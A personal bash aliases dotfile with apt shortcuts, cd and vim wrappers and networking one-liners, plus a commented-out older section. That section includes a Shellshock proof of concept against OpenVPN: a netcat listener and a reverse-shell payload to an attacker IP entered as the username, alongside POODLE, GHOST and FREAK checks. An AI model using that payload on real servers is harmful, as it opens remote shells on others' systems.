#!/usr/bin/env bash

# some useful sources
# https://github.com/Bash-it/bash-it/tree/master/aliases/available
# https://github.com/ohmybash/oh-my-bash/tree/master/aliases
# https://www.commandlinefu.com/commands/browse

# remember:
# ^xe       Open an editor and execute a command
# fc        Rapidly invoke an editor to write a command
# !:-       Insert the last command without the last argument
# <Esc> *
# !*        All parameter from the previous command line
# !!        Last command
# $_        Las argument
# ^foo^bar  Replace foo by bar in the previous command
# Alt+.     Last argument from the last command
# Esc+.     "
# Esc+_
# Alt+num+. n-th argument from the last command
# <Esc>+*   Insert the results of an autocmpletion

# TODO:
# intercept stdout/stderr:  strace -ff -e trace=write -e write=1,2 -p SOME_PID
# show apps that use the internet connection: ss -p


# shortcuts
alias apd='sudo apt list --upgradable'
alias apg='sudo apt upgrade'
alias aph='apt show'
alias api='sudo apt install'
alias app='sudo apt autoremove && sudo apt clean && sudo apt autoclean'
alias aps='apt search'
alias apu='sudo apt update'
alias cls='clear'
alias cp='cp -i'
alias cpv='rsync -ah --info=progress2'
alias grep='grep --color -i'
alias lt='ls --human-readable --size -1 -S --classify'
alias mkdir='mkdir -pv'
# shellcheck disable=SC2142
alias mnt='mount | awk -F'\'' '\'' '\''{ printf "%s\t%s\n",$1,$3; }'\'' | column -t | egrep ^/dev/ | sort'
alias mv='mv -iv'
alias pbcopy='xclip -selection clipboard'
alias pbpaste='xclip -selection clipboard -o'
alias perm='stat --printf "%a %n \n"'
alias rm='rm -iv'
alias rsync='rsync -vh'
alias ssh='ssh -C'
alias wget='wget -c'
alias xargs='xargs -r'

# https://cirw.in/blog/bracketed-paste
# http://thejh.net/misc/website-terminal-copy-paste
alias enable_bracketed_paste_mode='printf "\e[?2004h"'
alias disable_bracketed_paste_mode='printf "\e[?2004l"'

alias upgrade_fzf='cd ~/.fzf && git pull && ./install'

# one-liner utilities
__k_bak () { [ -r "$1" ] && mv "$1"{,.bak}; }
__k_cat () { if [ -d "$1" ]; then  ls "$1"; else command -v bat && bat "$@" || /bin/cat "$@"; fi }
__k_cmd2img () { convert -font courier -pointsize 12 -background black -fill white label:"$("$@")" -trim output.png; }
__k_ipinfo () { curl -s "http://ipinfo.io/$1"; }
__k_http_status () { curl -s -o /dev/null -w "%{http_code}" "$1"; }
__k_random_uuid_to_dev () { dev="$1"; sudo umount /dev/"$dev" && tune2fs /dev/"$dev" -U random; }
__k_rip_audio () { output="${1%.*}-ripped.${1##*.}"; mplayer -ao pcm -vo null -vc dummy -dumpaudio -dumpfile "$output" "$1"; }
__k_slugify () { echo "$*" | iconv -t ascii//TRANSLIT | sed -E 's/[^a-zA-Z0-9]+/-/g' | sed -E 's/^-+|-+$//g' | tr '[:upper:]' '[:lower:]'; }

__k_test_slugify () {
    # some punctuation
    test "$(__k_slugify ',.;:_-+â”€=ÂºÂªÂ¡!"Â·$%&/()[]{}Â¿?|@#~Â½Â¬')" == "oa-1-2" &&
    # some non-ascii charcters
    test "$(__k_slugify 'Ã¡ÃÃ Ã€ÄƒÄ‚Ã¢Ã‚Ã¥Ã…Ã¤Ã„Ä…Ä„Ã¦Ã†Ä‡Ä†ÄÄŒÃ§Ã‡Ä‘ÄÃ©Ã‰Ã¨ÃˆÄ—Ä–Ä™Ä˜ÄŸÃ­ÃÃ®ÃŽÃ¯ÃÄ¯Ä®Ä±ÅˆÅ‡Ã±Ã‘Ã³Ã“Ã²Ã’Ã¶Ã–Å‘ÅÃµÃ•Ã¸Ã˜Å¡Å ÅŸÅžÅ£Å¢ÃºÃšÃ¼ÃœÅ±Å°Å³Å²Å«ÅªÃ½ÃÅ¾Å½')" == "aaaaaaaaaaaaaaaeaeccccccddeeeeeeeegiiiiiiiiinnnnoooooooooooossssttuuuuuuuuuuyyzz";
}

alias bak=__k_bak
alias cat=__k_cat
alias clock='while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &'
alias cmd2img=__k_cmd2img
alias dkelc='docker exec -it $(dklcid) bash --login'
alias dklcip='docker inspect -f "{{.NetworkSettings.IPAddress}}" $(docker ps -l -q)'
alias ipinfo=__k_ipinfo
alias get_developer_excuses='curl -s  http://developerexcuses.com/ | grep nofollow | grep -Eo ">[^<]+" | cut -b 2-'
alias http_status=__k_http_status
alias make1mb='truncate -s 1m ./1MB.dat'
alias myip='curl -A firefox -s https://www.ignaciocano.com/ip'
alias http_server='python -m SimpleHTTPServer'
# shellcheck disable=SC2142
alias remove_duplicated_lines='awk '\''!x[$0]++'\'''
alias random_uuid_to_dev=__k_random_uuid_to_dev
alias rip_audio=__k_rip_audio
alias slugify=__k_slugify
alias smtp_debug_server='python -m smtpd -n -c DebuggingServer localhost:1025'
alias timewatch='(trap '\''kill -sSIGHUP $PPID'\'' SIGINT && echo "Stop it with ^D" && time read)'

# shellcheck disable=SC2139 disable=SC1083
alias best_ubuntu_server="curl -s http://mirrors.ubuntu.com/mirrors.txt | xargs -n1 -I {} sh -c 'echo $(curl -r 0-102400 -s -w %{speed_download} -o /dev/null {}/ls-lR.gz) {}' | sort -gr | head -3 | awk '{ print $2 }'"
# https://github.com/nvbn/thefuck
alias fuck='eval $(thefuck $(fc -ln -1))'

# http://jeroenjanssens.com/2013/08/16/quickly-navigate-your-filesystem-from-the-command-line.html
alias j='jump'

# aliased functions defined below
alias ..=__k_..
alias cd=__k_cd
alias vim=__k_vim

# improved cd'ing
# examples:
# `..` go up one directory
# `.. 3` go up three directories
# `.. foo` go up to the most upper directory whose name is `foo`
__k_.. () {
    local n
    local oldpwd
    local path
    local re

    oldpwd="$PWD"
    re='^[0-9]+$'
    if [[ -z "$1" ]] || [[ "$1" =~ ^[0-9]+$ ]]; then
        let n="${1:-1}"
        path="."
        while [ $n -gt 0 -a "$PWD" != "/" ]; do
            path="$path/.."
            ((n--))
        done
        builtin cd "$path"
    else
        builtin cd "${PWD/$1*/$1}"
    fi
    OLDPWD="$oldpwd"
}

# go to directory even if a file is passed as param
__k_cd () {
    local path
    if [ -f "$1" ]; then
        path="$(dirname "$1")"
        builtin cd "$path"
    elif [ -z "$1" ]; then
        builtin cd
    else
        builtin cd "$@"
    fi
}

# to make sure special and critical system files are opened with the
# addecuated commands. also make it easier open files into the
# desired line or the most recent opened file
__k_vim () {
    local fn
    local ln
    local re

    fn="$(readlink -f "$1")"
    if [ "$fn" == "/etc/passwd" ]; then
        sudo vipw -p
    elif [ "$fn" == "/etc/shadow" ]; then
        sudo vipw -s
    elif [ "$fn" == "/etc/group" ]; then
        sudo vigr
    elif [ "$fn" == "/etc/sudoers" ]; then
        sudo visudo
    else
        # allow things like this:
        # vim foo/bar.c:123
        fn=${1%:*}
        ln=${1#*:}
        re='^[0-9]+$'
        if [[ -r "$(readlink -f "$fn")" && "$ln" =~ $re ]]; then
            env vim "$fn" +"$ln"
        elif [[ -n "$@" ]]; then
            env vim "$@"
        else
            # edit last opened file on the last line
            env vim -c "normal '0"
        fi
    fi
}

# to avoid `..` to be aliased by other scripts. this must be at the end of the
# file
__k_alias () {
    if [[ "$1" =~ \.\.=.+ ]]; then
        false
    else
        builtin alias "$@"
    fi
}
alias alias=__k_alias

##### # date -d @1278410546
##### # mar jul  6 12:02:26 CEST 2010
##### 
##### # see:  http://explainshell.com/
##### 
##### alias ba="cat ~/.bash_aliases | grep"
##### alias va="vim ~/.bash_aliases"
##### 
##### 
##### # redirect motion in rpi (8081) from an external host via terminus in localhost 8001
##### # ssh -L 8001:192.168.1.6:8081 -p2279 karpoke@terminus.ignaciocano.com
##### 
##### # redirect mic in terminus (5555) to localhost (8001)
##### # (terminus): arecord -f dat | nc -l -p 5555
##### # (other): ssh -L 8001:localhost:5555 terminus.ignaciocano.com
##### # in android: use connect bot with local port redirection and mx player
##### 
##### ## helpers
##### 
##### # this function creates an alias for calling a function and decorates that function given as a parameter to avoid
##### # redefining it if already exists
##### # use example:  decorator alias_name "apt-cache search $@ | sort; aptitude search $@;"'
##### # creates alias 'alias_name' wich executes function 'falias_name'
##### function decorator() {
#####   local name="$1"
#####   local func="$2"
#####   [ -z "$name" -o -z "$func" ] && echo "(decorator) ERR: Missing parameter. Usage: decorator 'name' 'code sentences'" && return 1
##### 
#####   # check if $func ends with semicolon (;)
#####   func=$(sed 's/;\+$//' <<< $func)
##### 
#####   local condition="(type f$name >/dev/null 2>&1) || f$name() { $func; }"
#####   alias $name="$condition; f$name"
##### }
##### 
##### # this function test the decorator function
##### function test_decorator() {
#####   # obviously, you don't want to test dangerous commands that could damage your data or system!!!!
#####   local FUNCS=(
#####     'echo 1'
#####     'ls *'
#####     'awk '\''{if ($1 ~ /Package/) p = $2; if ($1 ~ /Installed/) printf("%9d %s\n", $2, p)}'\'' /var/lib/dpkg/status | sort -n | tail'
#####   )
##### 
#####   for ((i=0; i<${#FUNCS[*]}; i++)); do
#####     name="$(echo test_$RANDOM)"
#####     func="${FUNCS[$i]}"
##### 
#####     echo "[+] Testing: '$name' '$func'"
##### 
#####     decorator "$name" "$func"
#####     [ -z "$(type "$name" | grep alias)" ] && echo "ERR: $name is not an alias" && return 1
##### 
#####     # WARNING: execute alias to make function be defined
#####     # such an alias should'nt be evil
#####     eval "$name" >/dev/null 2>&1
#####     [ -z "$(type "f$name" | grep func)" ] && echo "ERR: f$name is not a function" && return 1
#####   done
#####   return 0 # avoid case when last eval return 1, and thus does this function then
##### }
##### 
##### # runs an alias hundred times and show the total execution time
##### function test_alias_performance() {
#####   local ALIAS="$1"
#####   [ -z "$ALIAS" ] && echo "ERR: Missing parameter" && return 1
#####   [ -z "$(type '$ALIAS' | grep alias)" ] && echo "ERR: Not an alias" && return 1
##### 
#####   local -i TIMES_DEFAULT=100
#####   local TIMES=${2:-$TIMES_DEFAULT}
##### 
#####   local -i start_ts=$(date +%s)
#####   for ((i=0; i<$TIMES; i++)); do
#####     eval "$ALIAS" >/dev/null 2>&1
#####   done
#####   local -i end_ts=$(date +%s)
#####   diff=$((end_ts-start_ts))
#####   echo "[+] $TIMES executions: $diff seconds"
##### }
##### 
##### function test_decorator_performance() {
#####   # this test compares the decorator performance against avoiding using it
#####   echo "[+] First without decorator"
#####   local name=$(echo test_$RANDOM)
#####   alias $name='awk '\''{if ($1 ~ /Package/) p = $2; if ($1 ~ /Installed/) printf("%9d %s\n", $2, p)}'\'' /var/lib/dpkg/status | sort -n | tail'
#####   test_alias_performance $name
#####   unalias $name
##### 
#####   echo "[+] Now with decorator"
#####   decorator $name 'awk '\''{if ($1 ~ /Package/) p = $2; if ($1 ~ /Installed/) printf("%9d %s\n", $2, p)}'\'' /var/lib/dpkg/status | sort -n | tail'
#####   test_alias_performance $name
#####   unalias $name
##### }
##### 
##### # unset a # unsets variable a if it exists, or else function a, if it exists
##### # unset -f a # unsets function a, no matter if it exists some variable a too
##### # ver el código de una función: type function_name
##### 
##### 
##### ## system updates (this aliases are walking over the internet since the world began, or, al last, since aptitude came to the world)
##### ## it's time to aptitude to rest. long life apt (15/dic/2016)
##### 
##### # simulate apt-get or aptitude (don't do any action) with flag: -s   (ex: aptitude -s upgrade)
##### 
##### # install a package
##### alias api='sudo apt install'
##### # end sudo session (timestamp): sudo -K
##### 
##### # safe-upgrade the system (this does not delete any package)
##### alias apg='sudo apt upgrade'
##### 
##### # detailed information about a package
##### alias aph='apt show'
##### # apt-cache stats
##### 
##### # checkinstall
##### alias checkinstall='sudo checkinstall --install=no'
##### 
##### # search for a package using apt-cache and aptitude search, reformatting the output to include the category
##### #alias aps='faps() { apt-cache search $@ | sort; aptitude search -F "%c%a#%M %s#%p#%d#" $@; }; faps'
##### # using brand new decorator function:
##### #decorator aps 'apt-cache search $@ | sort; aptitude search -F "%c%a#%M %s#%p#%d#" $@'
##### alias aps='apt search'
##### 
##### # update the list of packages
##### alias apu='sudo apt update'
##### 
##### # free space
##### alias app='sudo apt clean; sudo apt autoremove; sudo apt autoclean'
##### 
##### # to remember
##### alias do-release-upgrade='grep ^Prompt /etc/update-manager/release-upgrades; do-release-upgrade'
##### 
##### ## shellshock
##### # bash:
##### #   env x='() { :;}; echo vulnerable' bash -c 'echo hello'
##### # fix bash: sudo apt-get install --only-upgrade bash
##### # openvpn (usando la directiva auth-user-script-verify  para autenticar sin certificados):
##### # http://www.hackplayers.com/2014/10/comprobamos-el-poc-de-shellshock-para-openvpn.html
##### #  $ nc -l -vv -p 4444  # nc a la escucha
##### #  $ openvpn --client --remote 10.71.7.96 --auth-user-pass --dev tun --ca ca.cert --auth-nocache --comp-lzo
##### #  Enter Auth Username:() { :;};/bin/bash -i >& /dev/tcp/10.71.7.90/4444 0>&1 &   # nuestra ip
##### #  (lo ponemos tb como passwd)
##### 
##### ## poodle
##### # check:
##### #  echo | openssl s_client -connect localhost:443 -ssl3
##### #   nmap --script ssl-enum-ciphers -p 443 localhost |egrep -E "(SSLv3: No supported|closed)" ||echo "Site vulnerable to poodle"
##### # List: SSLv3 ciphers:  openssl ciphers -v 'DEFAULT' | awk '/SSLv3 Kx=(RSA|DH|DH(512))/ { print $1 }'
##### ## logjam
##### #  nmap --script ssl-enum-ciphers -p443 localhost | grep weak
##### #  nmap --script ssl-enum-ciphers -p443 localhost | grep -E 'DHE_.*_EXPORT'
##### # fix apache conf:  SSLProtocol all -SSLv2 -SSLv3
##### # fix nginx conf:  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;
##### # fix mysql: no way (but you can specify with protocol to use)
##### 
##### ## ghost
##### # check:
##### #  php -r '$e="0";for($i=0;$i<2500;$i++){$e="0$e";} gethostbyname($e);'
##### # check glibc version:
##### #   http://benohead.com/linux-check-glibc-version/
##### #  ldd --version
##### #  ldd `which netstat`  # consultando un programa que sabemos que lo usa: netstat
##### #  cat `gcc -print-file-name=libc.so`
##### #    /lib/x86_64-linux-gnu/libc.so.6 --version
##### #  lsof -p $$ | grep libc
##### #  lsof -p $$ | grep libc | awk ' { print $NF" --version"; } ' | sh
##### 
##### ## freak attack
##### # check:
##### #  $ openssl s_client -connect 192.168.1.5:443 -cipher EXPORT
##### #  if vulnerable there'll be sth like: New, TLSv1/SSLv3, Cipher is EXP-RC4-MD5
##### 
##### 
##### # upgrade the system (is like a full-upgrade, may delete something installed automagically)
##### alias apd='sudo apt dist-upgrade'
##### 
##### # check the license of a package
##### alias acp='apt-cache policy'
##### 
##### # check dependencies of a package
##### alias acd='apt-cache depends'
##### 
##### # check reverse dependencies of a package
##### alias acr='apt-cache rdepends'
##### 
##### # tmux attach
##### alias ta='tmux ls && tmux attach || tmux'
##### 
##### # show the last messages... notice: 'dt' conflicts with a command in package ditrack (lightweight distributed tracking system)
##### alias dt='dmesg | tail'
##### 
##### # show the most recent updated files
##### alias lst='ls -ltr | tail'
##### 
##### # remove orphan packages
##### alias debor='deborphan | xargs sudo apt -y remove --purge'
##### alias pclean='deborphan | xargs sudo apt -y remove --purge && sudo apt-get autoremove && sudo apt-get autoclean && sudo apt-get clean && sudo purge-old-kernels -y'
##### # apt-get autoremove && apt-get autoclean (elimina paquetes instalados automáticamente que ya no son necesarios, elimina paquetes que ya no están disponibles)
##### # get unpurged packages:   dpkg -l 2>/dev/null | grep "^rc" | cut -d ' ' -f3 | sort
##### # check for security updates:   /usr/lib/update-notifier/apt-check
##### # another check for security updates:   /usr/bin/apt-get --dry-run --show-upgraded upgrade 2> /dev/null | grep '-security' | grep "^Inst" | cut -d ' ' -f2 | sort | uniq
##### 
##### # purge configuration packages
##### alias purge_configuration='dpkg -l | grep ^rc | awk '\''{print $2}'\'' | xargs sudo dpkg --purge'
##### # $ dpkg --list | grep '^rc\b' | awk '{ print $2 }' | xargs sudo dpkg -P
##### # sudo aptitude purge `dpkg --get-selections | grep deinstall | awk '{print $1}'`
##### 
##### # latest installed
##### #alias latest_installed='awk '\''{if ($1 ~ /Package/) p = $2; if ($1 ~ /Installed/) printf("%9d %s\n", $2, p)}'\'' /var/lib/dpkg/status | sort -n | tail'
##### decorator latest_installed 'awk '\''{if ($1 ~ /Package/) p = $2; if ($1 ~ /Installed/) printf("%9d %s\n", $2, p)}'\'' /var/lib/dpkg/status | sort -n | tail'
##### 
##### # fuck you firefox
##### # inspired by http://robotlolita.me/
##### # https://github.com/robotlolita/fuck-you
##### # usage: fuck you firefox, fuck you bloody firefox, fuck off firefox
##### # last argument: ${!#} (+bash3.0) or ${@: -1} or  shift $(($# - 1)) or ${*: -1:1} or ${@:$#}
##### decorator fuck 'pkill "${@: -1}" && echo "Fuck yeah" || echo "Dunno"'
##### 
##### ## shortcuts (another tipical compilation)
##### 
##### # show all system shortcuts
##### # bind -p
##### 
##### # one dir up
##### #alias ..='cd ..'
##### # sólo remontamos hasta la raíz como máximo
##### #alias ..='fcd() { let n="${1:-1}"; while [ $n -gt 0 -a "$PWD" != "/" ]; do cd ..; n=$((n-1)); done; }; fcd'
##### # en lugar de ir subiendo directorio a directorio (con lo que perdemos el oldpwd y la posibilidad de hacer un cd -), guardamos la ruta en un string
##### #alias ..='fcd() { let n="${1:-1}"; local s=""; while [ $n -gt 0 ]; do s="../$s"; n=$((n-1)); done; echo $s; cd $s;}; fcd'
##### # si guardamos la ruta, podríamos abusar del comando (ej, hacer un ".. 10000"), por lo que volvemos a la primera versión, guardando el antiguo directorio
##### #alias ..='fcd() { local OPWD="$PWD"; let n="${1:-1}"; while [ $n -gt 0 -a "$PWD" != "/" ]; do cd ..; n=$((n-1)); done; OLDPWD="$OPWD"; }; fcd'
##### #alias ..='fcd() { local OPWD="$PWD"; local n="${1:-1}"; echo $n; while [ $n -gt 0 -a "$PWD" != "/" ]; do echo $n; \cd ..; echo $n; n=$((n-1)); echo $n; done; OLDPWD="$OPWD"; }; fcd'
##### # usando el decorator
##### #decorator ".." 'local OPWD="$PWD"; let n="${1:-1}"; while [ $n -gt 0 -a "$PWD" != "/" ]; do \cd ..; n=$((n-1)); done; OLDPWD="$OPWD";'
##### # shorter
##### decorator ".." 'local OPWD="$PWD"; let n="${1:-1}"; while [ $n -gt 0 -a "$PWD" != "/" ]; do \cd ..; n=$((n-1)); done; OLDPWD="$OPWD";'
##### #alias cdp='fcdp() { cd $(dirname "$1"); }; fcdp'
##### decorator cdp 'cd $(dirname "$1");'
##### 
##### # go to dir and edit file
##### #alias cdv='fcdv() { cdp "$1"; vim "$1"; }; fcdv'
##### decorator cdv 'cdp "$1"; vim "$1";'
##### 
##### # powered cd
##### alias cd='type autoenv_init >/dev/null 2>&1 && autoenv_init; source /home/karpoke/projects/scripts/memento.sh'
##### alias m1='memento.sh 1'  # to execute the first command in .msg
##### 
##### # colorness
##### alias ls='ls --color --classify'
##### 
##### # list last
##### alias ll='ls -ltr'
##### 
##### # vi sucks, vim rules, nothing more to say
##### alias vim='fvim() { local f="$(readlink -f "$1")"; if [ "$f" == "/etc/passwd" ]; then vipw; elif [ "$f" == "/etc/group" ]; then vigr; elif [ "$f" == "/etc/sudoers" ]; then visudo; else vim "$@"; fi; }; fvim'
##### alias vi='vim'
##### alias nano='vim'
##### 
##### # quick fingers sometimes mess up something
##### #alias rm='rm -vi'
##### 
##### # trash-cli
##### #  trash-list
##### #  trash-empty
##### #  trash-put
##### #  trash
##### #  restore-trash
##### alias rm='trash'
##### 
##### # quick fingers sometimes mess up something else, too
##### #alias cp='gcp -i' # gcp does not have -i flag!!!
##### alias cp='cp -vi'
##### 
##### # compress ssh (~/.ssh/config: add "Compression yes")
##### # change cipher (blowfish is faster than 3des (default) (~/.ssh/config: add "Cipher blowfish")
##### #alias ssh='ssh -C -c blowfish'
##### 
##### # preserve mode when copying
##### # compress (-C, but not necessary because we're using ~/.ssh/config)
##### # limit bandwith "-l 400" # kbps
##### alias scp='scp -pv'
##### 
##### # mawk is faster
##### alias awk='mawk'
##### 
##### # faster than bzip2
##### alias bzip2='pbzip2 -v9'
##### 
##### # wget with progress bar and continue
##### alias wget='wget --progress=dot -e dotbytes=100M --continue'
##### 
##### # tar multiprocessor (requires pigz)
##### alias tar='tar -I pigz'
##### 
##### # ag best options
##### alias ag='ag --smart-case --pager="less -MIRFX"'
##### 
##### # make a backup
##### #alias bak='fbak() { for f in "$@"; do cp $f{,.bak}; done; }; fbak'
##### decorator bak 'for f in "$@"; do cp -p "$f" "$f.bak"; done' # don't use brace expansion! # -p preserves owner, permissions, times
##### 
##### # quick fingers always mess up something
##### alias mv='mv -iv'
##### 
##### # in a perfect world uppercase would never exist
##### alias grep='grep -bin --color'
##### 
##### # speed a litte up the f'ing ping
##### alias ping='ping -n'
##### 
##### # clock 
##### alias clock='clear; while sleep 1; do d=$(date +"%H:%M:%S"); tput setaf 1 cup 0; toilet -t -f mono12 $d; tput setaf 4 cup 8; toilet -t -f mono12 -F flop $d;tput cup 0; done'
##### alias date_clock_upper='while sleep 1; do tput sc; tput cup 0 $(($COLUMNS-28)) ; date; tput rc; done &'
##### 
##### # less on steroids
##### #   -X --no-init  do not clear the screen after viewing file
##### alias less='less -x4RFsX'
##### # less with colors:  less -R
##### # less with chopping lines: less -S # instead of wrapping
##### # less like "tail -f": less +F
##### # tail -f || tailf || less +F || multitail
##### 
##### # reset the terminal
##### # alias r='r() { printf "\033c";}' ## reset
##### #decorator r 'printf "\033c"' ## reset
##### alias r='printf "\033c"' ## reset
##### 
##### # look for something inside all of that
##### # alias s='find . -type f -iname \* -print0 | xargs -0 grep'
##### # alias s='fs() { grep -ir $@ *; }; fs'
##### # alias s='(type fs >/dev/null 2>&1) || fs() { grep --binary-file=without-match -ir $@ *; }; fs'
##### # alias s='(type fs >/dev/null |&) || fs() { grep --binary-file=without-match -ir $@ *; }; fs'  # bash +4
##### # move files from one directory to another and prompting for each one
##### # find torrents.bak3 -name \*.torrent -print0 | xargs -0 -p -n 1 mv -t torrents
##### # you should use ag: ag --txt || ag --html || ag --py
##### decorator s 'grep --binary-file=without-match -ir $@ *'
##### 
##### # look for file names
##### #alias f='(type ff >/dev/null 2>&1) || ff() { ls | grep "$1"; }; ff'
##### #alias f='(type ff >/dev/null |&) || ff() { ls | grep "$1"; }; ff'  # bash +4
##### #decorator f 'ls | grep "$1"'
##### alias f='ls | grep'
##### 
##### decorator s 'grep --binary-file=without-match -ir $@ *'
##### 
##### # look for file names
##### #alias f='(type ff >/dev/null 2>&1) || ff() { ls | grep "$1"; }; ff'
##### #alias f='(type ff >/dev/null |&) || ff() { ls | grep "$1"; }; ff'  # bash +4
##### #decorator f 'ls | grep "$1"'
##### alias f='ls | grep'
##### 
##### # if you are with us you are like one of us
##### alias ch644='find . -type f -exec chmod 644 {} \;'
##### alias ch755='find . -type d -exec chmod 755 {} \;'
##### alias normalize_perms='find . -type f -exec chmod 644 {} \; && find . -type d -exec chmod 755 {} \;'
##### 
##### # copy perms
##### #alias cpmod='fcpmod () { chmod $(perl -e '\''printf "%04o\n", (stat shift)[2] & 0777;'\'' $1) $2 ; }; fcpmod'
##### #decorator cpmod 'chmod $(perl -e '\''printf "%04o\n", (stat shift)[2] & 0777;'\'' $1) $2'
##### decorator cpmod 'local ref="$1"; shift; chmod --reference="$ref" "$@"'
##### decorator cpown 'local ref="$1"; shift; chown --reference="$ref" "$@"'
##### 
##### # view hidden files
##### alias vh='ls -d .* | sed 1,2d'
##### 
##### # show real free memory (http://www.linuxatemyram.com/)
##### alias free='free -m | awk '\''{ if ($1 == "Mem:") total=$2; if ($1 == "-/+") print "\n**", $4*100.0/total, "% free \n";}'\''; free -m'
##### 
##### # sus
##### alias sus='sort | uniq -c | sort -nr'
##### 
##### # md5
##### #alias md5='fmd5() { echo -n "$1" | md5sum | awk '\''{print $1}'\''; }; fmd5'
##### decorator md5 'echo -n "$1" | md5sum | awk '\''{print $1}'\'';'
##### 
##### # telegram
##### decorator tg 'local to="$1";local msg="";if [ $# -gt 1 ];then shift 1;msg="$@";else while read line; do if [ -z "$msg" ];then msg=$line;else msg="$msg $line";fi;done;if [ -z "$to" ];then to=$(awk '\''{print $1}'\'' < << $msg);msg=$(awk '\''{$1="";print $0}'\'' <<< $msg);fi;fi;expect -c "match_max 100000;spawn /home/karpoke/git-read-only/tg/telegram -k /home/karpoke/git-read-only/tg/tg.pub;expect \"User \";send -- \"msg $to $msg\r\";expect \"Sent\";send \"quit\";"'
##### # last users connection. save output from command "contact_list" in a file. then run:
##### # $ sed 's/:.\+(/ (/' contact_list.txt | sort -k5 -k8,9 -k2 | column -t   # sort by status, date, time, name
##### 
##### ## command-fu-sion (one of the most useful commands repository)
##### 
##### # well, that things available when you are inside a function in bash
##### alias param_help='fparam_help() { echo "$0 $@"; echo "\$0 $0"; echo "\$1 $1"; echo "\$# $#"; echo "\$@ $@"; echo "\$_ $_"; echo "\$$ $$"; echo "!\$ !$";  }; fparam_help 1 2 3 4'
##### # get function's source: $ typeset -f <function name>; declare -f <function name>
##### 
##### # all the possible date formats with examples, great
##### alias date_help='for F in {a..z} {A..Z} :z ::z :::z;do echo $F: `date +%$F`;done|sed "/:[\ \t\n]*$/d;/%[a-zA-Z]/d"'
##### 
##### # vim help
##### function :h { vim +":h $1" +'wincmd o' +'nnoremap q :q!<CR>' ;}
##### 
##### # where is site-packages?
##### alias whereissitepackages='python -c "from distutils.sysconfig import get_python_lib; print get_python_lib()"'
##### 
##### # is it friday?
##### alias is-it-friday='[ $(date +%w) == 5 ] && echo "HELL YES IT IS" || echo "No, it'\''s not friday"'
##### 
##### # what connections are still open
##### alias open_connections='lsof -r 2 -u $(whoami) -i -a'
##### alias open_connections_by_ip='netstat -antu | awk '\''$5 ~ /[0-9]:/{split($5, a, ":"); ips[a[1]]++} END {for (ip in ips) print ips[ip], ip | "sort -k1 -nr"}'\'''
##### 
##### # what is listening in which ports
##### alias oports="echo 'User: Command: Port:'; echo '----------------------------' ; lsof -i 4 -P -n | grep -i 'listen' | awk '{print \$3, \$1, \$9}' | sed 's/ [a-z0-9\.\*]*:/ /' | sort -k 3 -n |xargs printf '%-10s %-10s %-10s\n' | uniq"
##### 
##### # in which state the connections are
##### alias connections_status='netstat -n | awk "/^tcp/ {++B[\$NF]} END {for(a in B) print a, B[a]}"'
##### #netstat -tn | awk 'NR>2 {print $6}' | sort | uniq -c | sort -rn
##### ## ss -lnp src :22
##### 
##### # unsuccessful ssh connection attempts
##### alias sshi="gunzip -c /var/log/auth.log.*.gz | cat - /var/log/auth.log.{0,1} | grep 'Invalid user' | awk '{print $8;}' | sort | uniq -c | less"
##### 
##### # what server is running there
##### alias whichserver='fwhichserver() { wget -S "$1" 2>&1 | grep Server; }; fwhichserver'
##### 
##### # which package a command belongs to
##### alias whichpackage='fwhichpackage() { [ -r "$1" ] && dpkg -S "$1" || dpkg -S $(which  $1); }; fwhichpackage'
##### 
##### # which files are included in a package
##### alias whichfiles='fwhichfiles() { dpkg -L $1; }; fwhichfiles'
##### 
##### # rainbow
##### alias colors='for code in {0..255}; do echo -e "\e[38;05;${code}m $code: Test"; done'
##### alias colors_of_fortune='fortune -s | cowsay -f tux | lolcat -s 64'
##### # rainbow: yes "$(seq 231 -1 16)" | while read i; do printf "\x1b[48;5;${i}m\n"; sleep .02; done
##### # cursor bounce
##### # x=1;y=1;xd=1;yd=1;while true;do if [[ $x == $LINES || $x == 0 ]]; then xd=$(( $xd *-1 )) ; fi ; if [[ $y == $COLUMNS || $y == 0 ]]; then yd=$(( $yd * -1 )) ; fi ; x=$(( $x + $xd )); y=$(( $y + $yd )); printf "\33[%s;%sH" $x $y; sleep 0.02 ;done
##### # rainbow cursor
##### # a=1;x=1;y=1;xd=1;yd=1;while true;do if [[ $x == $LINES || $x == 0 ]]; then xd=$(( $xd *-1 )) ; fi ; if [[ $y == $COLUMNS || $y == 0 ]]; then yd=$(( $yd * -1 )) ; fi ; x=$(( $x + $xd )); y=$(( $y + $yd )); printf "\33[%s;%sH\33[48;5;%sm \33[0m" $x $y $(($a%199+16)) ;a=$(( $a + 1 )) ; sleep 0.001 ;done
##### # terminal screen saver
##### # j=0;a=1;x=1;y=1;xd=1;yd=1;while true;do for i in {1..2000} ; do if [[ $x == $LINES || $x == 0 ]]; then xd=$(( $xd *-1 )) ; fi ; if [[ $y == $COLUMNS || $y == 0 ]]; then yd=$(( $yd * -1 )) ; fi ; x=$(( $x + $xd )); y=$(( $y + $yd )); printf "\33[%s;%sH\33[48;5;%sm . \33[0m" $x $y $(( $a % 8 + 16 + $j % 223 )) ;a=$(( $a + 1 )) ; done ; x=$(( x%$COLUMNS + 1 )) ; j=$(( $j + 8 )) ;done
##### # print line number: $LINENO
##### # rainbow shell: bash | lolcat -a -s 250
##### 
##### 
##### # ascii art, best art ever
##### alias ascii='man ascii'
##### # for i in {1..256};do p=" $i";echo -e "${p: -3} \\0$(($i/64*100+$i%64/8*10+$i%8))";done|cat -t|column -c120
##### # Show File System Hierarchy
##### alias hier='man hier'
##### 
##### # happy ps tree
##### alias pst='pstree -Gap | less -r'
##### 
##### # thousands of tabs open in firefox
##### alias lasttabs_firefox='grep -Eo "url\":\"[^\"]+" ~/.mozilla/firefox/*/session*.js | cut -d\" -f3'
##### 
##### # who the world thinks I am
##### #alias myip='curl -s checkip.dyndns.org | grep -Eo "[0-9\.]+"'
##### #alias myip='curl -s www.ignaciocano.com/tools/ip.php'
##### # checkip.dyndns.org
##### # checkip.dyndns.org:8245
##### # fmbip.com
##### # icanhazip.com
##### # ifconfig.me
##### # ip.appspot.com
##### # ipecho.net/plain
##### # ipinfo.io
##### # ip.u3mx.com
##### # myip.dnsomatic.com
##### # dig myip.opendns.com @resolver1.opendns.com +short
##### # snar.co/ip/
##### # whatismyip.org
##### # www.check-my-ip.net
##### # www.ipchicken.com
##### # curl -s https://ipleak.net | \grep -Eo "IP Details of [^<]+" | awk '{print $4}'  # alos: ipleak.net/127.0.0.1
##### #
##### # check ip reputation
##### # wget -O - -q https://isc.sans.edu/api/ip/$(myip)?json
##### 
##### # get a short link
